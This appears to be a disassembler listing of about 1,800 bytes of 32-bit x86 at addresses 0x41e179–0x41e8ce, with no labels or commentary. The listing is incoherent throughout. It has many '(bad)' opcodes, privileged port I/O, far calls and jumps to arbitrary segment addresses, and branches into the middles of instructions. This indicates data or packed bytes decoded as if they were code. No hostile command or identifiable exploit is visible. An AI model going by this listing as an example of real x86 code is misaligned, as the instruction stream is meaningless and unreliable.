  41e179:	add    DWORD PTR [edi],0x3386f4d2
  41e17f:	jo     0x41e130
  41e181:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e182:	les    ebx,FWORD PTR [esi]
  41e184:	push   cs
  41e185:	xchg   BYTE PTR ds:0x28f35790,bl
  41e18b:	mov    ecx,DWORD PTR [ebp+0x70]
  41e18e:	retf   
  41e18f:	jnp    0x41e1e5
  41e191:	or     DWORD PTR [ebx-0x2f],esp
  41e194:	ins    BYTE PTR es:[edi],dx
  41e195:	pop    ebx
  41e197:	and    esi,ebx
  41e199:	outs   dx,DWORD PTR ds:[esi]
  41e19a:	pop    edx
  41e19b:	xchg   DWORD PTR [ebp-0x41],ebx
  41e19e:	mov    esp,DWORD PTR [esi+0x2997fde8]
  41e1a4:	pop    ss
  41e1a5:	ret    0x7d07
  41e1a8:	das    
  41e1a9:	cmp    eax,0xfb9c6046
  41e1ae:	dec    esi
  41e1af:	int    0x4b
  41e1b1:	shl    DWORD PTR [edx],cl
  41e1b3:	mov    dl,0x68
  41e1b5:	std    
  41e1b6:	stc    
  41e1b7:	out    dx,eax
  41e1b8:	xchg   ebx,eax
  41e1b9:	cmp    BYTE PTR [ebx+0x75864600],0xd8
  41e1c0:	into   
  41e1c1:	ins    BYTE PTR es:[edi],dx
  41e1c2:	test   eax,0x1e6bb2f7
  41e1c7:	cmp    dl,BYTE PTR [ebx]
  41e1c9:	dec    esi
  41e1ca:	mov    dh,cl
  41e1cc:	mov    al,ds:0x59316f0
  41e1d1:	fild   WORD PTR [eax-0x6b2ec025]
  41e1d7:	out    0x80,al
  41e1d9:	daa    
  41e1da:	add    edx,DWORD PTR [edx]
  41e1dc:	inc    eax
  41e1dd:	xchg   ebx,eax
  41e1de:	pop    ebp
  41e1df:	hlt    
  41e1e0:	inc    ebx
  41e1e1:	int    0x99
  41e1e3:	(bad)  
  41e1e4:	sahf   
  41e1e5:	imul   ah
  41e1e7:	push   0xffffffaf
  41e1e9:	ss call 0x13ee:0x645590a9
  41e1f1:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41e1f3:	xor    BYTE PTR [ecx-0x5b],cl
  41e1f6:	pop    ecx
  41e1f7:	call   0x2452:0xf2bbeef
  41e1fe:	je     0x41e1c3
  41e200:	cmp    bl,BYTE PTR [ebx-0x33fc6cbd]
  41e206:	std    
  41e207:	stos   BYTE PTR es:[edi],al
  41e208:	scas   al,BYTE PTR es:[edi]
  41e209:	push   ds
  41e20a:	push   ecx
  41e20b:	pop    DWORD PTR [ecx-0xe26c081]
  41e211:	cmc    
  41e212:	jmp    0x3ced:0xfc0f6a54
  41e219:	mov    BYTE PTR [ecx],0xb
  41e21c:	sbb    al,0xbf
  41e21e:	sub    DWORD PTR [ecx],0xffffff8c
  41e221:	pop    edi
  41e222:	das    
  41e223:	int3   
  41e224:	xchg   ecx,eax
  41e225:	xor    al,bh
  41e227:	push   ecx
  41e228:	fistp  DWORD PTR [edx+ecx*1]
  41e22b:	xchg   edx,eax
  41e22c:	pop    ebp
  41e22d:	gs nop
  41e22f:	jg     0x41e1e7
  41e231:	cmp    DWORD PTR [ebx],esi
  41e233:	pusha  
  41e234:	popf   
  41e235:	fwait
  41e236:	shl    BYTE PTR [edx+0x54],cl
  41e239:	pop    ebx
  41e23a:	or     ch,BYTE PTR [eax+0x30a1b542]
  41e240:	lods   eax,DWORD PTR ds:[esi]
  41e241:	rcl    esi,cl
  41e243:	loope  0x41e27d
  41e245:	arpl   WORD PTR gs:[eax-0x3b],di
  41e249:	fistp  WORD PTR [ecx-0x61]
  41e24c:	jg     0x41e226
  41e24e:	add    bh,al
  41e250:	xor    edx,DWORD PTR [esi+0x7bf12d74]
  41e256:	sub    esi,eax
  41e258:	icebp  
  41e259:	fild   DWORD PTR [esi+0xf]
  41e25c:	stos   DWORD PTR es:[edi],eax
  41e25d:	in     eax,dx
  41e25e:	add    dh,BYTE PTR [ecx-0x4c]
  41e261:	push   ebx
  41e262:	shr    BYTE PTR [esi+0x3a4c4bb2],1
  41e268:	into   
  41e269:	pop    edx
  41e26a:	sar    dh,cl
  41e26c:	jecxz  0x41e28b
  41e26e:	jmp    0x41e2be
  41e270:	clc    
  41e271:	ret    
  41e272:	cli    
  41e273:	je     0x41e298
  41e275:	inc    ecx
  41e276:	lock out 0xd0,eax
  41e279:	mov    cl,0x8e
  41e27b:	mov    edi,0x7f112cf5
  41e280:	push   ds
  41e281:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e282:	jmp    0xa4dd8bfd
  41e287:	inc    ebx
  41e288:	mov    ds,esi
  41e28a:	test   DWORD PTR [ebp+0x60],esi
  41e28d:	mov    ds:0x1c65c492,eax
  41e292:	mov    ds:0x12d6de95,al
  41e297:	lds    ebx,FWORD PTR [ecx+0x36750acb]
  41e29d:	pop    eax
  41e29e:	(bad)  
  41e29f:	in     eax,dx
  41e2a0:	jle    0x41e24b
  41e2a2:	and    eax,0x27c66fb5
  41e2a7:	mov    ds:0x9bc03b98,eax
  41e2ac:	inc    eax
  41e2ad:	sbb    eax,edx
  41e2af:	lahf   
  41e2b0:	fisttp DWORD PTR [edi]
  41e2b2:	(bad)  
  41e2b3:	out    dx,eax
  41e2b4:	enter  0x9632,0xd8
  41e2b8:	out    dx,eax
  41e2b9:	jmp    0xec6350d5
  41e2be:	das    
  41e2bf:	add    BYTE PTR [edi],0x9c
  41e2c2:	and    esi,0xa8ebb8d5
  41e2c8:	leave  
  41e2c9:	mov    ah,0x66
  41e2cb:	push   ebp
  41e2cc:	mov    ds:0x63d7dbbd,eax
  41e2d1:	outs   dx,BYTE PTR ds:[esi]
  41e2d2:	cmp    al,0x58
  41e2d4:	fiadd  WORD PTR [edi+0x2213eafd]
  41e2da:	xchg   esi,eax
  41e2db:	lods   eax,DWORD PTR ds:[esi]
  41e2dc:	test   BYTE PTR [ebx],cl
  41e2de:	sbb    eax,0x53c88e55
  41e2e3:	pop    ebp
  41e2e4:	mov    ch,0xe6
  41e2e6:	int3   
  41e2e7:	test   eax,0xcaa6901a
  41e2ec:	and    BYTE PTR [eax-0x139198f0],ah
  41e2f2:	adc    bh,BYTE PTR [edi+0x4c]
  41e2f5:	xchg   DWORD PTR [ecx+0x2f],edx
  41e2f8:	adc    ah,BYTE PTR [ebx+ebx*8+0x6c]
  41e2fc:	jmp    0x41e35f
  41e2fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2ff:	cmp    al,0xb9
  41e301:	dec    edx
  41e302:	sbb    cl,BYTE PTR [ebx]
	...
  41e310:	add    BYTE PTR [esi-0x9],ch
  41e313:	mov    ebx,0xfe6dbb69
  41e318:	not    DWORD PTR [edx+eax*1+0x31]
  41e31c:	pop    ecx
  41e31d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e31e:	fist   DWORD PTR [edx]
  41e320:	jne    0x41e38d
  41e322:	pop    esi
  41e323:	add    DWORD PTR [eax],eax
  41e325:	stos   DWORD PTR es:[edi],eax
  41e326:	add    eax,DWORD PTR [eax]
  41e328:	add    BYTE PTR [ebp+edx*2-0x5cb091df],bh
  41e32f:	inc    eax
  41e330:	and    eax,esp
  41e332:	jmp    0x969e2b69
  41e337:	or     eax,0xcc21419e
  41e33c:	pop    edi
  41e33d:	std    
  41e33e:	ret    
  41e33f:	idiv   DWORD PTR [eax-0x26]
  41e342:	push   esi
  41e343:	jmp    0x40d6:0x9d1bb78d
  41e34a:	inc    edi
  41e34b:	inc    ecx
  41e34c:	dec    eax
  41e34d:	add    al,0xed
  41e34f:	xrelease mov BYTE PTR [ebx-0x6bbb6b86],bh
  41e356:	add    al,0xc7
  41e358:	adc    ebp,eax
  41e35a:	xchg   DWORD PTR [edi-0x278444a5],ecx
  41e360:	ffreep st(1)
  41e362:	jae    0x41e3c0
  41e364:	push   edi
  41e365:	test   BYTE PTR [ebx+0x60fb183b],ch
  41e36b:	ds push ss
  41e36d:	lods   al,BYTE PTR ds:[esi]
  41e36e:	sub    DWORD PTR [ebp+0x787b912c],ecx
  41e374:	ss pop ecx
  41e376:	mov    dh,0xb9
  41e378:	mov    DWORD PTR [edi-0x15cbd8b3],ecx
  41e37e:	lods   eax,DWORD PTR ds:[esi]
  41e37f:	sbb    eax,0xb4fd6e27
  41e384:	sahf   
  41e385:	adc    dl,0x54
  41e388:	pushf  
  41e389:	mov    ecx,0xd860478
  41e38e:	loopne 0x41e367
  41e390:	cmp    al,0xf4
  41e392:	cwde   
  41e393:	xchg   ebx,eax
  41e394:	imul   ecx,edx,0x2345741b
  41e39a:	pop    ecx
  41e39b:	aaa    
  41e39c:	lods   al,BYTE PTR ds:[esi]
  41e39d:	cmp    ah,ah
  41e39f:	popa   
  41e3a0:	jp     0x41e3a3
  41e3a2:	stc    
  41e3a3:	out    dx,al
  41e3a4:	sbb    al,0xd8
  41e3a6:	lds    edx,FWORD PTR [edx+0x36841460]
  41e3ac:	jge    0x41e404
  41e3ae:	mov    ah,0x7f
  41e3b0:	out    dx,eax
  41e3b1:	in     eax,dx
  41e3b2:	inc    eax
  41e3b3:	(bad)  [eax]
  41e3b5:	pop    ds
  41e3b6:	icebp  
  41e3b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3b8:	inc    ecx
  41e3b9:	ret    0x4b59
  41e3bc:	and    edi,ebp
  41e3be:	rcr    DWORD PTR [esi],cl
  41e3c0:	je     0x41e38a
  41e3c2:	push   edi
  41e3c3:	(bad)  
  41e3c4:	xchg   edx,eax
  41e3c5:	jecxz  0x41e3d4
  41e3c7:	mov    ecx,0x8fb1fd69
  41e3cc:	or     ebp,DWORD PTR ds:0x50083341
  41e3d2:	loop   0x41e392
  41e3d4:	dec    edx
  41e3d5:	(bad)  
  41e3d6:	push   0x8d542d4a
  41e3db:	xor    dl,BYTE PTR [ebp+eax*2+0x63]
  41e3df:	call   0x7e58:0x9f95c02c
  41e3e6:	jg     0x41e465
  41e3e8:	sbb    eax,0xa78807c
  41e3ed:	(bad)  
  41e3ee:	into   
  41e3ef:	and    ebx,edi
  41e3f1:	mov    eax,0xa9121d34
  41e3f6:	mov    esp,0xe0fc3635
  41e3fb:	cld    
  41e3fc:	call   0x1ce6c2ef
  41e401:	rcl    BYTE PTR [ecx],cl
  41e403:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e404:	cmp    edx,esi
  41e406:	or     al,0xcc
  41e408:	adc    eax,0xe3f0f366
  41e40d:	sub    DWORD PTR [esi+esi*8-0x21],esi
  41e411:	neg    BYTE PTR [edi-0x53]
  41e414:	mov    ecx,0x5d545c8a
  41e419:	test   BYTE PTR [edx],bh
  41e41b:	cmp    eax,esp
  41e41d:	dec    ebx
  41e41e:	or     ecx,0xb6c7768d
  41e424:	lods   eax,DWORD PTR ds:[esi]
  41e425:	sar    ecx,1
  41e427:	pop    edx
  41e428:	mov    bh,BYTE PTR [ebp+0x64]
  41e42b:	aam    0xa7
  41e42d:	mov    ds:0x89b105fe,al
  41e432:	mov    eax,0x2cb9b0fa
  41e437:	rol    BYTE PTR [edi+0x20],1
  41e43a:	adc    cl,BYTE PTR [ecx+0x31cd6746]
  41e440:	rcr    BYTE PTR [ebp-0x1fa8a92],cl
  41e446:	jb     0x41e3eb
  41e448:	leave  
  41e449:	xchg   edx,eax
  41e44a:	xor    ebx,esi
  41e44c:	mov    eax,0x463c2794
  41e451:	jo     0x41e43f
  41e453:	pop    esi
  41e454:	mov    DWORD PTR [esi+0x2ec6aed3],esp
  41e45a:	lahf   
  41e45b:	pop    eax
  41e45c:	push   edi
  41e45d:	jne    0x41e40d
  41e45f:	call   edi
  41e461:	clc    
  41e462:	cwde   
  41e463:	into   
  41e464:	outs   dx,DWORD PTR ds:[esi]
  41e465:	lds    eax,FWORD PTR [edx]
  41e467:	je     0x41e41e
  41e469:	shl    DWORD PTR [esi+0x77],1
  41e46c:	add    BYTE PTR [ebp-0x5581b2ec],0xe8
  41e473:	mov    esp,0xbc0c47cf
  41e478:	addr16 sbb eax,0x709a7826
  41e47e:	lea    eax,[ebx+0x2d]
  41e481:	aam    0x1b
  41e483:	mov    ecx,0xf34a4901
  41e488:	dec    edx
  41e489:	inc    edi
  41e48a:	pop    eax
  41e48b:	rol    BYTE PTR [edi-0x15],cl
  41e48e:	push   ss
  41e48f:	mov    ds:0x7df21621,al
  41e494:	jbe    0x41e451
  41e496:	lds    ecx,FWORD PTR [edx+edx*2]
  41e499:	scas   al,BYTE PTR es:[edi]
  41e49a:	repz icebp 
  41e49c:	pushf  
  41e49d:	imul   edx,DWORD PTR [eax+0x65],0x1f
  41e4a1:	jg     0x41e500
  41e4a3:	cdq    
  41e4a4:	push   es
  41e4a5:	scas   al,BYTE PTR es:[edi]
  41e4a6:	ja     0x41e46c
  41e4a8:	test   DWORD PTR [eax],ebp
  41e4aa:	pop    edi
  41e4ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4ac:	and    dl,BYTE PTR [esi+0x5e]
  41e4af:	push   0x5a
  41e4b1:	cmp    BYTE PTR [ebp+0xa],ch
  41e4b4:	int3   
  41e4b5:	outs   dx,DWORD PTR ds:[esi]
  41e4b6:	and    DWORD PTR [edi-0x80],esi
  41e4b9:	mul    DWORD PTR [edx-0x42]
  41e4bc:	neg    DWORD PTR [ecx-0x10]
  41e4bf:	mov    cl,0x8f
  41e4c1:	pop    ss
  41e4c2:	ins    DWORD PTR es:[edi],dx
  41e4c3:	cmp    BYTE PTR [ecx],ch
  41e4c5:	inc    ecx
  41e4c6:	sub    DWORD PTR [esi],esi
  41e4c8:	adc    dl,0xf8
  41e4cb:	xor    al,BYTE PTR [ebp-0x1bc7c449]
  41e4d1:	das    
  41e4d2:	mov    eax,ds:0xa7ed9a66
  41e4d7:	pop    ebx
  41e4d8:	jne    0x41e4ec
  41e4da:	sbb    bl,BYTE PTR [eax]
  41e4dc:	out    dx,al
  41e4dd:	jnp    0x41e550
  41e4df:	push   ebx
  41e4e0:	sbb    al,0xb7
  41e4e2:	les    edx,FWORD PTR [ebx+0x51]
  41e4e5:	and    eax,DWORD PTR [ecx]
  41e4e7:	dec    esi
  41e4e8:	ss and ch,ah
  41e4eb:	scas   eax,DWORD PTR es:[edi]
  41e4ec:	bt     DWORD PTR [esi+0xf4ab0e5],esp
  41e4f3:	ret    
  41e4f4:	clc    
  41e4f5:	jb     0x41e48a
  41e4f7:	pushf  
  41e4f8:	ret    
  41e4f9:	jb     0x41e546
  41e4fb:	pop    esp
  41e4fc:	in     al,0x9
  41e4fe:	cmp    esp,DWORD PTR [ebp-0x27]
  41e501:	push   0xe6ad8666
  41e506:	add    eax,0xe015361b
  41e50b:	pushf  
  41e50c:	fild   DWORD PTR [ecx-0x5e]
  41e50f:	cmp    edx,DWORD PTR [ecx-0x120bf306]
  41e515:	stos   BYTE PTR es:[edi],al
  41e516:	mov    cl,0x8f
  41e518:	aad    0xc6
  41e51a:	es test eax,0x46ffd9c5
  41e520:	cmp    edx,edx
  41e522:	(bad)  [ecx+ebx*2-0x6161e7f9]
  41e529:	pop    esi
  41e52a:	mov    WORD PTR [eax],cs
  41e52c:	and    DWORD PTR [ebx-0x4948a998],0x7e
  41e533:	fcom   st(4)
  41e535:	and    eax,0x93f146c9
  41e53a:	jno    0x41e53d
  41e53c:	or     BYTE PTR [ebx+0x357f897b],bh
  41e542:	jle    0x41e514
  41e544:	outs   dx,BYTE PTR ds:[esi]
  41e545:	fs inc ecx
  41e547:	push   0x46
  41e549:	gs retf 
  41e54b:	ret    
  41e54c:	sti    
  41e54d:	lahf   
  41e54e:	shl    BYTE PTR [edi],1
  41e550:	adc    dl,bh
  41e552:	enter  0x447e,0x5c
  41e556:	pop    ebp
  41e557:	sbb    bl,BYTE PTR [edi+eax*8-0x2b]
  41e55b:	arpl   WORD PTR [eax+0x5],di
  41e55e:	cmp    eax,0xa7547673
  41e563:	adc    eax,0xa5f8fa56
  41e568:	or     DWORD PTR [edi-0x27],edi
  41e56b:	mov    BYTE PTR [esi-0x19],cl
  41e56e:	mov    edi,0x98359838
  41e573:	int3   
  41e574:	test   eax,0xdb391a93
  41e579:	(bad)  
  41e57b:	cmp    BYTE PTR [ebx+0x2f4d93fd],cl
  41e581:	pop    ebp
  41e582:	jl     0x41e5fe
  41e584:	mov    ebx,0xc4937bd0
  41e589:	cmp    al,0x7c
  41e58b:	lods   al,BYTE PTR ds:[esi]
  41e58c:	inc    eax
  41e58d:	mov    ch,0x99
  41e58f:	and    bh,cl
  41e591:	out    0xa5,eax
  41e593:	mov    cl,0x18
  41e595:	push   esp
  41e596:	jb     0x41e5b4
  41e598:	out    dx,eax
  41e599:	jbe    0x41e55a
  41e59b:	in     eax,0xc0
  41e59d:	dec    edx
  41e59e:	rcr    BYTE PTR [ebx],0x2d
  41e5a1:	pop    ebp
  41e5a2:	out    dx,al
  41e5a3:	xchg   ecx,eax
  41e5a4:	xchg   esi,eax
  41e5a5:	mov    dh,0xf1
  41e5a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5a8:	jo     0x41e621
  41e5aa:	fsub   st,st(2)
  41e5ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5ad:	in     al,0x27
  41e5af:	push   eax
  41e5b0:	xchg   ebx,eax
  41e5b1:	sbb    DWORD PTR [ecx+edi*8+0x4a],0xf56dd9aa
  41e5b9:	cld    
  41e5ba:	xchg   ebx,eax
  41e5bb:	mov    es,ecx
  41e5bd:	inc    esp
  41e5be:	jnp    0x41e5b8
  41e5c0:	out    dx,al
  41e5c1:	in     eax,dx
  41e5c2:	test   al,0x17
  41e5c4:	out    dx,eax
  41e5c5:	or     DWORD PTR [eax],0xffffff9e
  41e5c8:	addr16 lock icebp 
  41e5cb:	dec    edi
  41e5cc:	(bad)  
  41e5cd:	clc    
  41e5ce:	imul   edx,DWORD PTR [edx],0xfee32c8a
  41e5d4:	scas   al,BYTE PTR es:[edi]
  41e5d5:	inc    edx
  41e5d6:	jl     0x41e585
  41e5d8:	out    dx,al
  41e5d9:	mov    ds:0xa992e13b,al
  41e5de:	or     eax,DWORD PTR [ebx+0x3b70449]
  41e5e4:	imul   esi,esi,0x2c58e192
  41e5ea:	clc    
  41e5eb:	(bad)  [ecx]
  41e5ed:	jne    0x41e59a
  41e5ef:	adc    al,0xcf
  41e5f1:	popa   
  41e5f2:	(bad)  
  41e5f3:	sbb    al,0xf2
  41e5f5:	lahf   
  41e5f6:	dec    edx
  41e5f7:	in     eax,0xd7
  41e5f9:	sub    eax,0x4dd39d92
  41e5fe:	scas   al,BYTE PTR es:[edi]
  41e5ff:	jo     0x41e5df
  41e601:	fcom   DWORD PTR [ecx+0x4e]
  41e604:	sbb    ah,BYTE PTR [edx-0x26]
  41e607:	out    dx,al
  41e608:	out    dx,al
  41e609:	gs jg  0x41e5b4
  41e60c:	jnp    0x41e5b7
  41e60e:	daa    
  41e60f:	push   ds
  41e610:	xor    bl,ah
  41e612:	rol    DWORD PTR [ecx-0x12fabf2a],1
  41e618:	jmp    0x41e68c
  41e61a:	push   edi
  41e61b:	jnp    0x41e5c3
  41e61d:	fisubr WORD PTR [ebp+0x51]
  41e620:	stos   DWORD PTR es:[edi],eax
  41e621:	and    al,0x9
  41e623:	cmc    
  41e624:	(bad)  
  41e625:	adc    al,BYTE PTR [ebp*8-0x1740ce8b]
  41e62c:	fnsave [ebx-0x3a]
  41e62f:	(bad)  
  41e631:	pop    eax
  41e632:	mov    ss,ecx
  41e634:	mov    ah,0x12
  41e636:	gs pop eax
  41e638:	sar    BYTE PTR [edx-0x28],0xd6
  41e63c:	or     eax,0xcc9d8be5
  41e641:	sbb    DWORD PTR [esi+edx*2-0x70d83933],ecx
  41e648:	mov    al,ds:0x3a8bb315
  41e64d:	sub    dh,BYTE PTR [ebx+ecx*8+0x24]
  41e651:	sbb    eax,0xb999a36d
  41e656:	fs mov dh,0x5
  41e659:	aas    
  41e65a:	push   es
  41e65b:	inc    edx
  41e65c:	sbb    al,0x3a
  41e65e:	out    0x37,eax
  41e660:	fdivp  st(6),st
  41e662:	sub    BYTE PTR [edi+0x1801868b],ah
  41e668:	lods   al,BYTE PTR ds:[esi]
  41e669:	or     bl,BYTE PTR [eax+eax*2]
  41e66c:	popf   
  41e66d:	out    0x22,eax
  41e66f:	and    DWORD PTR [ebx+0x55],0x76
  41e673:	jp     0x41e674
  41e675:	sti    
  41e676:	xor    eax,DWORD PTR [ebx+0x27]
  41e679:	xchg   edi,eax
  41e67a:	xchg   ebx,eax
  41e67b:	rol    DWORD PTR [edi+0x6f8fc337],cl
  41e681:	stos   DWORD PTR es:[edi],eax
  41e682:	mov    gs,WORD PTR [ecx+ecx*1]
  41e685:	dec    eax
  41e686:	adc    BYTE PTR [ebp-0x27],dh
  41e689:	mov    DWORD PTR [ecx],ebp
  41e68b:	push   es
  41e68c:	mov    bh,0xa4
  41e68e:	mov    eax,0xb71c7962
  41e693:	out    dx,al
  41e694:	retf   0xad9a
  41e697:	hlt    
  41e698:	int    0x1c
  41e69a:	test   DWORD PTR [ebp-0x6d442e3f],ebp
  41e6a0:	fsubr  st,st(6)
  41e6a2:	cmp    eax,0xc2cd1dd8
  41e6a7:	idiv   bl
  41e6a9:	push   0x833dd304
  41e6ae:	mov    dh,0xb5
  41e6b0:	adc    edi,DWORD PTR ds:0xe1499d8b
  41e6b6:	sbb    BYTE PTR [esi],dh
  41e6b8:	push   ebp
  41e6b9:	shl    DWORD PTR [edx],1
  41e6bb:	xchg   esi,eax
  41e6bc:	stos   BYTE PTR es:[edi],al
  41e6bd:	xor    DWORD PTR [esi-0x53],0x3c
  41e6c1:	sbb    ecx,esp
  41e6c3:	push   0xffffffcd
  41e6c5:	mov    al,ds:0x34817eb
  41e6ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6cb:	out    dx,eax
  41e6cc:	ret    0xc89d
  41e6cf:	mov    dl,0x91
  41e6d1:	push   ebp
  41e6d2:	and    DWORD PTR [eax+0x0],eax
	...
  41e6e0:	add    BYTE PTR ds:0xfffb5fc4,ch
  41e6e6:	sti    
  41e6e7:	lods   eax,DWORD PTR ds:[esi]
  41e6e8:	(bad)  
  41e6e9:	or     DWORD PTR [edi],ebp
  41e6eb:	jmp    0x2f29145d
  41e6f0:	adc    al,0x16
  41e6f2:	bound  eax,QWORD PTR [ecx]
  41e6f4:	add    BYTE PTR [ebx-0x6bfffffd],ch
  41e6fa:	sbb    BYTE PTR [ecx+0x73bce47],ah
  41e700:	fdiv   st,st(2)
  41e702:	popa   
  41e703:	pop    esp
  41e704:	jae    0x41e6fa
  41e706:	popf   
  41e707:	xchg   BYTE PTR [eax],ch
  41e709:	out    dx,eax
  41e70a:	nop
  41e70b:	rcr    BYTE PTR [edi+0x59],1
  41e70e:	dec    edi
  41e70f:	sar    BYTE PTR [eax],0x54
  41e712:	push   eax
  41e713:	xchg   ebp,eax
  41e714:	xor    ebx,DWORD PTR [eax-0x65]
  41e717:	xor    DWORD PTR [edi],esi
  41e719:	or     eax,0x3fc1d473
  41e71e:	lmsw   WORD PTR ds:0x74465854
  41e725:	ds mov edi,0x426d40c4
  41e72b:	(bad)  
  41e72c:	sub    BYTE PTR [edx+0x6c],al
  41e72f:	add    edx,esp
  41e731:	inc    edi
  41e732:	pop    ss
  41e733:	sub    bl,al
  41e735:	test   dh,dl
  41e737:	mov    ds:0x37453612,eax
  41e73c:	push   edx
  41e73d:	cdq    
  41e73e:	push   esp
  41e73f:	sahf   
  41e740:	mov    ch,0xa7
  41e742:	pop    edi
  41e743:	mov    esi,0x60bc9708
  41e748:	xor    cl,BYTE PTR [esi+0x3]
  41e74b:	cmp    esi,esi
  41e74d:	mov    cl,0x33
  41e74f:	shr    esi,0x7
  41e752:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e753:	cmp    BYTE PTR [edi],ah
  41e755:	retf   0x726f
  41e758:	aam    0x29
  41e75a:	push   cs
  41e75b:	cmp    BYTE PTR [edi],bl
  41e75d:	and    al,0x70
  41e75f:	aas    
  41e760:	cmp    al,0x59
  41e762:	pop    es
  41e763:	jg     0x41e78e
  41e765:	push   edi
  41e766:	mov    edi,0x4f37d166
  41e76b:	icebp  
  41e76c:	imul   esp,ebx,0x5c79171a
  41e772:	nop
  41e773:	(bad)  
  41e774:	jl     0x41e704
  41e776:	hlt    
  41e777:	mov    ecx,0x81f3b220
  41e77c:	xchg   DWORD PTR [ebx+0x302423a],ebp
  41e782:	pop    edi
  41e783:	ret    0x1dbb
  41e786:	nop
  41e787:	xor    al,0x2c
  41e789:	mov    ebp,0xe862b3f0
  41e78e:	retf   
  41e78f:	aas    
  41e790:	or     eax,0xf07ea351
  41e795:	(bad)
  41e798:	leave  
  41e799:	or     ecx,ecx
  41e79b:	out    dx,eax
  41e79c:	inc    ebp
  41e79d:	add    eax,0x9438f9b
  41e7a2:	jae    0x41e7a4
  41e7a4:	cmp    al,0x22
  41e7a6:	or     bh,bh
  41e7a8:	sbb    edx,DWORD PTR [edi+eax*1]
  41e7ab:	add    BYTE PTR es:[ecx+ecx*8-0x1c93e127],dl
  41e7b3:	jmp    DWORD PTR [ebp+0x20]
  41e7b6:	jae    0x41e77c
  41e7b8:	ss stc 
  41e7ba:	in     al,0x66
  41e7bc:	add    eax,0xff0c8e13
  41e7c1:	pop    esp
  41e7c2:	fisubr WORD PTR [edi+ebx*8+0x17]
  41e7c6:	nop
  41e7c7:	xchg   esp,eax
  41e7c8:	inc    edx
  41e7c9:	xor    esi,ecx
  41e7cb:	mov    edi,0xe77d80ce
  41e7d0:	dec    ecx
  41e7d1:	aaa    
  41e7d2:	jo     0x41e766
  41e7d4:	data16 sbb bl,BYTE PTR ss:[ebx-0x36]
  41e7d9:	cli    
  41e7da:	push   eax
  41e7db:	cmc    
  41e7dc:	mov    bh,0x0
  41e7df:	mov    al,ds:0xff842ca8
  41e7e4:	or     al,0xef
  41e7e6:	adc    BYTE PTR [edi-0x28],dl
  41e7e9:	test   DWORD PTR [esi+0x4b72a78c],ebx
  41e7ef:	stos   BYTE PTR es:[edi],al
  41e7f0:	pop    esi
  41e7f1:	push   ecx
  41e7f2:	fdiv   DWORD PTR [edx-0x1c]
  41e7f5:	lods   eax,DWORD PTR ds:[esi]
  41e7f6:	lock jmp 0x41e855
  41e7f9:	xor    eax,0xfdb3784e
  41e7fe:	fldz   
  41e800:	arpl   WORD PTR [esi-0x68d2e1a],si
  41e806:	fcom   DWORD PTR [edi]
  41e808:	sub    BYTE PTR [edi-0x6a],bl
  41e80b:	imul   eax,DWORD PTR [ebx-0x59754662],0x44
  41e812:	out    0x7f,al
  41e814:	add    al,ch
  41e816:	test   eax,0xa02bfac8
  41e81b:	ret    
  41e81c:	jbe    0x41e851
  41e81e:	pop    esp
  41e81f:	push   ebp
  41e820:	xor    al,0x4d
  41e822:	sti    
  41e823:	xlat   BYTE PTR ds:[ebx]
  41e824:	shl    BYTE PTR [ebx],1
  41e826:	cmp    DWORD PTR ds:0xf0cf1328,ebx
  41e82c:	xor    BYTE PTR ds:0xa81c95f3,dh
  41e832:	mov    WORD PTR [esi+0x146a9605],ss
  41e838:	pusha  
  41e839:	or     ecx,edi
  41e83b:	data16 (bad) 
  41e83d:	ins    BYTE PTR es:[edi],dx
  41e83e:	xchg   esp,eax
  41e83f:	jns    0x41e7f2
  41e841:	daa    
  41e842:	ds sub dl,bl
  41e845:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e846:	add    edx,DWORD PTR [ebp-0x46]
  41e849:	imul   ebp,DWORD PTR [edi+0xd],0xffffff93
  41e84d:	cmp    DWORD PTR [ebx+ebp*1+0x78],edi
  41e851:	xchg   ebx,ebx
  41e853:	fcomi  st,st(7)
  41e855:	ret    0x6f24
  41e858:	leave  
  41e859:	fist   WORD PTR [ebx+eax*8+0x49]
  41e85d:	inc    esi
  41e85e:	dec    eax
  41e85f:	mov    eax,0xbfa9668c
  41e864:	add    dl,BYTE PTR [ecx]
  41e866:	push   es
  41e867:	xchg   edi,eax
  41e868:	mov    dl,0x7b
  41e86a:	or     al,0x1e
  41e86c:	mov    eax,ds:0x9907f8f9
  41e871:	push   ecx
  41e872:	add    ah,dl
  41e874:	xchg   esp,eax
  41e875:	mov    edi,0x7a74589a
  41e87a:	fiadd  WORD PTR [esi+ecx*4]
  41e87d:	(bad)  
  41e87e:	loopne 0x41e884
  41e880:	test   al,0x3f
  41e882:	stos   DWORD PTR es:[edi],eax
  41e883:	cmp    bh,BYTE PTR [edx+ecx*1-0x263605e1]
  41e88a:	jg     0x41e8ca
  41e88c:	add    BYTE PTR [eax],bl
  41e88e:	xchg   esp,eax
  41e88f:	adc    BYTE PTR [esi+ebx*4],dl
  41e892:	out    dx,eax
  41e893:	(bad)  [edx]
  41e895:	fiadd  DWORD PTR [ecx]
  41e897:	fild   DWORD PTR [edi+0x4b]
  41e89a:	out    0x84,eax
  41e89c:	ror    BYTE PTR [ebx+0x64d2a328],0x44
  41e8a3:	sbb    esi,DWORD PTR [ebx+0x62b0bd4c]
  41e8a9:	cmc    
  41e8aa:	scas   eax,DWORD PTR es:[edi]
  41e8ab:	push   edi
  41e8ac:	clc    
  41e8ad:	test   BYTE PTR [ebx+0x350c43fb],0x35
  41e8b4:	clc    
  41e8b5:	jbe    0x41e85d
  41e8b7:	sub    bh,bh
  41e8b9:	add    eax,DWORD PTR [ebp+edi*2-0x214074b2]
  41e8c0:	adc    eax,0x3cd10124
  41e8c5:	cmp    bh,BYTE PTR [ecx+0x42]
  41e8c8:	xor    BYTE PTR [esi-0x2660e9e9],bh
  41e8ce:	call   0xdb68ec73
